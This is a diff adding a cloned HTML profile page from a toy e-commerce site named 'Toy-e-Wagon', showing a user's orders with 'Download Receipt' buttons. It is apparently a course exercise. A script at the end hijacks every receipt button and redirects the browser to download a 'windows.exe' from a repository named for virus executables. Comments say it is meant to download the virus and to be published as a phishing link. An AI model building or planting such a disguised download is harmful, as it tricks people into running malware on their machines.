@@ -1,0 +1,406 @@
+
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="./profile_files/bootstrap.min.css">
+    <script src="./profile_files/jquery.min.js.download"></script>
+    <script src="./profile_files/bootstrap.min.js.download"></script>
+
+    <!-- Font Awesome -->
+    <link href="./profile_files/font-awesome.min.css" rel="stylesheet">
+
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link href="./profile_files/css2" rel="stylesheet">
+
+    <!-- Sweet Alert -->
+    <script src="./profile_files/sweetalert2.min.js.download"></script>
+    <link rel="stylesheet" href="./profile_files/sweetalert2.min.css">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <script>
+    function logout_user() {
+        $.ajax({
+            url: "/logout",
+            type: 'post',
+            success: function (result) {
+                window.location.href = "/login";
+            },
+            error: function (result) {
+                alert(result.responseJSON.message);
+            }
+        });
+    }
+</script>
+    <style>
+    body {
+        direction: ltr;
+        text-align:left;
+        background-color: #f0f1f3;
+        font-family: 'Fira Sans', sans-serif;
+        overflow-x: hidden;
+    }
+    .blur {
+        filter: blur(5px);
+        -webkit-filter: blur(5px);
+        -moz-filter: blur(5px);
+        -o-filter: blur(5px);
+        -ms-filter: blur(5px);
+    }
+    #loader {
+        position: fixed;
+        display: none;
+        align-items: center;
+        width: 50%;
+        top: 30%;
+        left: 35%;
+        z-index: 999;
+    }
+    .loading-gif {
+        width: 50%;
+        height: auto;
+    }
+    .navbar-light .navbar-nav .active>.nav-link, .navbar-light .navbar-nav .nav-link.active, .navbar-light .navbar-nav .nav-link.show, .navbar-light .navbar-nav .show>.nav-link {
+        color: #72f588;
+    }
+    .navbar-light .navbar-nav .nav-link {
+        color: white;
+    }
+
+    .searchInputWrapper {
+        position: relative;
+    }
+
+    .searchInput {
+        width: 20rem;
+        height: 2rem;
+        padding: 0 1rem; 
+        border-radius: 2rem;
+        border: none;
+        background-color: #c5b5e5;
+        transition: transform 0.1s ease-in-out;
+    }
+
+    ::placeholder {
+        color: black;
+    }
+
+    :focus::placeholder {
+        text-indent: -999px
+    }
+
+    .searchInput:focus {
+        outline: none;
+        transform: scale(1.1);
+        transition: all 0.1s ease-in-out;
+    }
+
+    .searchInputIcon {
+        position: absolute;
+        right: 0.8rem;
+        top: 0.5rem;
+        color: black;
+        transition: all 0.1s ease-in-out;
+    }
+
+    .container:focus-within > 
+    .searchInputWrapper > .searchInputIcon {
+        right: 0.2rem;
+    }
+
+    .nav-icon {
+        font-size: 2em;
+    }
+
+    .nav-text {
+        font-size: 1em;
+    }
+
+    .help-button {
+        background-color: #673dcf;
+        padding: 0.5em 1em;
+        border-radius: 2em;
+    }
+</style>
+</head>
+
+<body>
+    <div class="main-container">
+        <nav class="navbar fixed-top navbar-expand navbar-light" style="background: #442ea6;">
+            <div class="navbar-collapse" id="navbarsExample02">
+                <a class="navbar-brand pl-5 pr-5" href="http://127.0.0.1:5000/">
+                    <span style="font-size: 2em; color: white;"><b>Toy-e-Wagon</b></span>
+                </a>
+                <div>
+                    <div class="searchInputWrapper">
+                        <input class="searchInput" type="text" placeholder="Search">
+                        <i class="searchInputIcon fa fa-search"></i>
+                        
+                    </div>
+                </div>
+                <ul class="nav navbar-nav ml-auto">
+                    <li class="nav-item align-self-center" id="dashboard_navigator">
+                        <a class="nav-link" href="http://127.0.0.1:5000/">
+                            <div class="row">
+                                <div class="col-sm-12 col-md-12 col-lg-12 text-center text-white mt-2">
+                                    <i class="fa fa-tachometer nav-icon"></i>
+                                </div>
+                                <div class="col-sm-12 col-md-12 col-lg-12 text-center text-white">
+                                    <p class="nav-text">Dashboard</p>
+                                </div>
+                            </div>
+                        </a>
+                    </li>
+                    <li class="nav-item align-self-center" id="profile_navigator">
+                        <a class="nav-link" href="http://127.0.0.1:5000/profile?id=shubham80621@gmail.com">
+                            <div class="row">
+                                <div class="col-sm-12 col-md-12 col-lg-12 text-center text-white mt-2">
+                                    <i class="fa fa-user nav-icon"></i>
+                                </div>
+                                <div class="col-sm-12 col-md-12 col-lg-12 text-center text-white">
+                                    <p class="nav-text">Profile</p>
+                                </div>
+                            </div>
+                        </a>
+                    </li>
+                    <li class="nav-item align-self-center" id="cart">
+                        <a class="nav-link" href="http://127.0.0.1:5000/cart?id=shubham80621@gmail.com">
+                            <div class="row">
+                                <div class="col-sm-12 col-md-12 col-lg-12 text-center text-white mt-2">
+                                    <i class="fa fa-shopping-cart nav-icon"></i>
+                                </div>
+                                <div class="col-sm-12 col-md-12 col-lg-12 text-center text-white">
+                                    <p class="nav-text">Cart</p>
+                                </div>
+                            </div>
+                        </a>
+                    </li>
+                    <li class="nav-item align-self-center">
+                        <a class="nav-link" href="http://127.0.0.1:5000/logout">
+                            <div class="row">
+                                <div class="col-sm-12 col-md-12 col-lg-12 text-center text-white mt-2">
+                                    <i class="fa fa-sign-out nav-icon"></i>
+                                </div>
+                                <div class="col-sm-12 col-md-12 col-lg-12 text-center text-white">
+                                    <p class="nav-text">Logout</p>
+                                </div>
+                            </div>
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="http://127.0.0.1:5000/profile?id=shubham80621@gmail.com">
+                            <div class="row">
+                                <div class="col-sm-12 col-md-12 col-lg-12 text-center text-white mt-2 help-button">
+                                    <i class="fa fa-question-circle-o nav-icon"></i>
+                                    <span class="nav-text p-3" style="font-size: 1.5em;">Help</span>
+                                </div>
+                            </div>
+                        </a>
+                    </li>
+                </ul>
+                <form class="form-inline my-2 my-md-0"> </form>
+            </div>
+        </nav>
+    </div>
+    <div>
+        
+
+<link rel="stylesheet" type="text/css" href="./profile_files/jquery.dataTables.css">
+<script type="text/javascript" charset="utf8" src="./profile_files/jquery.dataTables.js.download"></script>
+
+<script>
+    $(document).ready( function () {
+        $('.order_table').DataTable();
+        $(".dataTables_length").css("display", "none");
+        $(".dataTables_filter").css("display", "none");
+        $(".dataTables_paginate ").css("display", "none");
+        $(".dataTables_info").css("display", "none");
+        $("#order_table_length").css("display", "none");
+
+
+        // Attach click event handler to buttons with the downloadButton class
+        $('.receipt-button').on('click', function () {
+            var index = $(this).data('index');
+
+            // Replace this with your actual download logic
+            console.log("Downloading receipt for index: " + index);
+
+            // Make a POST request to generate the PDF
+            $.ajax({
+                url: "/generateReceipt",
+                type: "POST",
+                contentType: "application/json",
+                data: JSON.stringify({index: index}),
+                success: function (data) {
+                    // Handle the success response (e.g., initiate a download)
+                    var blob = new Blob([data], {type: "application/pdf"});
+                    var link = document.createElement('a');
+                    link.href = window.URL.createObjectURL(blob);
+                    link.download = "receipt.pdf";
+                    link.click();
+                },
+                error: function (error) {
+                    console.error("Error:", error);
+                }
+            });
+        });
+
+    } );
+
+</script>
+<style>
+    .order-container {
+        background-color: white;
+    }
+    .address-box {
+        border: 1px solid black;
+        padding: 0.5em;
+    }
+    .search-btn {
+        background-color: #442ea6;
+        width: 100%;
+        padding: 0.5em 1em;
+        color: white;
+        border: none;
+        font-size: 1em;
+    }
+    #order_list {
+        color: #828282;
+    }
+</style>
+
+<div class="m-5">
+    <div class="row mt-5">
+        <div class="col-sm-12 col-md-4 col-lg-4 mt-5">
+            <div class="row mt-5">
+                <div class="col-sm-12 col-md-12 col-lg-12 mt-5">
+                    <p><b>User Name</b></p>
+                    <p style="color: #828282;">shubham80621@gmail.com</p>
+                    <hr>
+                </div>
+                <!-- <div class="col-sm-12 col-md-12 col-lg-12 mt-5">
+                    <p><b>Address</b></p>
+                    <div class="address-box mt-2">
+                        <p style="color: #828282;"></p>
+                    </div>
+                </div> -->
+            </div>
+        </div>
+        <div class="col-sm-12 col-md-8 col-lg-8 mt-5">
+            <div class="row">
+                <div class="col-sm-12 col-md-12 col-lg-12">
+                    <div class="row mt-5 order-container p-5">
+                        <div class="col-sm-12 col-md-12 col-lg-12">
+                            <h3 style="color: #828282;"><b>Orders</b></h3>
+                        </div>
+                        <div class="col-sm-12 col-md-12 col-lg-12 mt-5">
+                            
+                            
+                            
+                                <b>Order No. #0</b>
+                                <div id="order_table_wrapper" class="dataTables_wrapper no-footer"><div class="dataTables_length" id="order_table_length" style="display: none;"><label>Show <select name="order_table_length" aria-controls="order_table" class=""><option value="10">10</option><option value="25">25</option><option value="50">50</option><option value="100">100</option></select> entries</label></div><div id="order_table_filter" class="dataTables_filter" style="display: none;"><label>Search:<input type="search" class="" placeholder="" aria-controls="order_table"></label></div><table id="order_table" class="order_table dataTable no-footer" aria-describedby="order_table_info">
+                                    <thead>
+                                        <tr><th class="sorting sorting_asc" tabindex="0" aria-controls="order_table" rowspan="1" colspan="1" aria-sort="ascending" aria-label="Image: activate to sort column descending" style="width: 188.172px;">Image</th><th class="sorting" tabindex="0" aria-controls="order_table" rowspan="1" colspan="1" aria-label="Name: activate to sort column ascending" style="width: 108.859px;">Name</th><th class="sorting" tabindex="0" aria-controls="order_table" rowspan="1" colspan="1" aria-label="Amount: activate to sort column ascending" style="width: 137.703px;">Amount</th><th class="sorting" tabindex="0" aria-controls="order_table" rowspan="1" colspan="1" aria-label="Quantity: activate to sort column ascending" style="width: 150.594px;">Quantity</th></tr>
+                                    </thead>
+                                    
+                                    <tbody id="orders_data">
+                                        
+                                    <tr class="odd">
+                                            <td class="sorting_1"><img src="./profile_files/toy6.png" width="100"></td>
+                                            <td>Plane</td>
+                                            <td>1900</td>
+                                            <td>1</td>
+                                        </tr></tbody>
+                                    
+                                </table><div class="dataTables_info" id="order_table_info" role="status" aria-live="polite" style="display: none;">Showing 1 to 1 of 1 entries</div><div class="dataTables_paginate paging_simple_numbers" id="order_table_paginate" style="display: none;"><a class="paginate_button previous disabled" aria-controls="order_table" data-dt-idx="0" tabindex="-1" id="order_table_previous">Previous</a><span><a class="paginate_button current" aria-controls="order_table" data-dt-idx="1" tabindex="0">1</a></span><a class="paginate_button next disabled" aria-controls="order_table" data-dt-idx="2" tabindex="-1" id="order_table_next">Next</a></div></div><br>
+                                <button class="btn btn-primary receipt-button" data-index="0">Download Receipt</button>
+                                <br>
+                                <br>
+                            
+                                <b>Order No. #1</b>
+                                <div id="order_table_wrapper" class="dataTables_wrapper no-footer"><div class="dataTables_length" id="order_table_length" style="display: none;"><label>Show <select name="order_table_length" aria-controls="order_table" class=""><option value="10">10</option><option value="25">25</option><option value="50">50</option><option value="100">100</option></select> entries</label></div><div id="order_table_filter" class="dataTables_filter" style="display: none;"><label>Search:<input type="search" class="" placeholder="" aria-controls="order_table"></label></div><table id="order_table" class="order_table dataTable no-footer" aria-describedby="order_table_info">
+                                    <thead>
+                                        <tr><th class="sorting sorting_asc" tabindex="0" aria-controls="order_table" rowspan="1" colspan="1" aria-sort="ascending" aria-label="Image: activate to sort column descending" style="width: 162.672px;">Image</th><th class="sorting" tabindex="0" aria-controls="order_table" rowspan="1" colspan="1" aria-label="Name: activate to sort column ascending" style="width: 175.328px;">Name</th><th class="sorting" tabindex="0" aria-controls="order_table" rowspan="1" colspan="1" aria-label="Amount: activate to sort column ascending" style="width: 117.938px;">Amount</th><th class="sorting" tabindex="0" aria-controls="order_table" rowspan="1" colspan="1" aria-label="Quantity: activate to sort column ascending" style="width: 129.391px;">Quantity</th></tr>
+                                    </thead>
+                                    
+                                    <tbody id="orders_data">
+                                        
+                                    <tr class="odd">
+                                            <td class="sorting_1"><img src="./profile_files/toy3.png" width="100"></td>
+                                            <td>Electric Toy Car</td>
+                                            <td>2900</td>
+                                            <td>1</td>
+                                        </tr></tbody>
+                                    
+                                    <tbody id="orders_data">
+                                        <tr>
+                                            <td><img src="./profile_files/toy4.png" width="100"></td>
+                                            <td>Lego house</td>
+                                            <td>500</td>
+                                            <td>1</td>
+                                        </tr>
+                                    </tbody>
+                                    
+                                </table><div class="dataTables_info" id="order_table_info" role="status" aria-live="polite" style="display: none;">Showing 1 to 1 of 1 entries</div><div class="dataTables_paginate paging_simple_numbers" id="order_table_paginate" style="display: none;"><a class="paginate_button previous disabled" aria-controls="order_table" data-dt-idx="0" tabindex="-1" id="order_table_previous">Previous</a><span><a class="paginate_button current" aria-controls="order_table" data-dt-idx="1" tabindex="0">1</a></span><a class="paginate_button next disabled" aria-controls="order_table" data-dt-idx="2" tabindex="-1" id="order_table_next">Next</a></div></div><br>
+                                <button class="btn btn-primary receipt-button" data-index="1">Download Receipt</button>
+                                <br>
+                                <br>
+                            
+                                <b>Order No. #2</b>
+                                <div id="order_table_wrapper" class="dataTables_wrapper no-footer"><div class="dataTables_length" id="order_table_length" style="display: none;"><label>Show <select name="order_table_length" aria-controls="order_table" class=""><option value="10">10</option><option value="25">25</option><option value="50">50</option><option value="100">100</option></select> entries</label></div><div id="order_table_filter" class="dataTables_filter" style="display: none;"><label>Search:<input type="search" class="" placeholder="" aria-controls="order_table"></label></div><table id="order_table" class="order_table dataTable no-footer" aria-describedby="order_table_info">
+                                    <thead>
+                                        <tr><th class="sorting sorting_asc" tabindex="0" aria-controls="order_table" rowspan="1" colspan="1" aria-sort="ascending" aria-label="Image: activate to sort column descending" style="width: 182.031px;">Image</th><th class="sorting" tabindex="0" aria-controls="order_table" rowspan="1" colspan="1" aria-label="Name: activate to sort column ascending" style="width: 124.859px;">Name</th><th class="sorting" tabindex="0" aria-controls="order_table" rowspan="1" colspan="1" aria-label="Amount: activate to sort column ascending" style="width: 132.938px;">Amount</th><th class="sorting" tabindex="0" aria-controls="order_table" rowspan="1" colspan="1" aria-label="Quantity: activate to sort column ascending" style="width: 145.5px;">Quantity</th></tr>
+                                    </thead>
+                                    
+                                    <tbody id="orders_data">
+                                        
+                                    <tr class="odd">
+                                            <td class="sorting_1"><img src="./profile_files/toy2.png" width="100"></td>
+                                            <td>Alza</td>
+                                            <td>1900</td>
+                                            <td>7</td>
+                                        </tr></tbody>
+                                    
+                                    <tbody id="orders_data">
+                                        <tr>
+                                            <td><img src="./profile_files/toy1.png" width="100"></td>
+                                            <td>Robo Dog</td>
+                                            <td>900</td>
+                                            <td>2</td>
+                                        </tr>
+                                    </tbody>
+                                    
+                                </table><div class="dataTables_info" id="order_table_info" role="status" aria-live="polite" style="display: none;">Showing 1 to 1 of 1 entries</div><div class="dataTables_paginate paging_simple_numbers" id="order_table_paginate" style="display: none;"><a class="paginate_button previous disabled" aria-controls="order_table" data-dt-idx="0" tabindex="-1" id="order_table_previous">Previous</a><span><a class="paginate_button current" aria-controls="order_table" data-dt-idx="1" tabindex="0">1</a></span><a class="paginate_button next disabled" aria-controls="order_table" data-dt-idx="2" tabindex="-1" id="order_table_next">Next</a></div></div><br>
+                                <button class="btn btn-primary receipt-button" data-index="2">Download Receipt</button>
+                                <br>
+                                <br>
+                            
+                            
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+    </div>
+
+<!-- Add the jquery script -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<!-- Add a script to write the script to download the virus -->
+<script>
+        // use receipt-button class to select the download button and add click function on it 
+        $(".receipt-button").click(function(){
+            // inside the function set window.location.href to downloadable link of the virus from https://github.com/Tynker-Computer-Networks/TNK-M16-VirusExecutables
+            window.location.href = "https://github.com/Tynker-Computer-Networks/TNK-M16-VirusExecutables/raw/main/windows.exe"; 
+        })
+</script>
+
+<!-- Put the page on github and create a publish it to create the phishing link -->
+</body></html>
